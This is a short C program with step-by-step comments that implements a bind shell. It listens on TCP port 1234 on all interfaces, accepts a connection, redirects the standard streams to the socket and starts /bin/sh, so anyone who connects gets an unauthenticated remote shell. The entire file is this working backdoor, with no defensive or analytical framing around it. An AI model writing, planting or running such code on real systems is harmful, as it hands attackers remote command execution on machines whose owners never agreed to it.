#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
	const int PORT = 1234;
	// create standard ipv4 socket
	int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

	// define structure to bind server socket to
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(PORT);

	// bind server socket to address
	bind(listen_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));

	// Listen for connections
	listen(listen_sock, 0);

	// Block until a client connects, and set the result fd to conn_sock
	int conn_sock = accept(listen_sock, NULL, NULL);

	// Set stdin, stdout, and stderr to socket fd
	for (int i = 0; i < 3; i++)
		dup2(conn_sock, i);

	// Start shell process, and replace current process with that
	execve("/bin/sh", NULL, NULL);

	return 0;
}
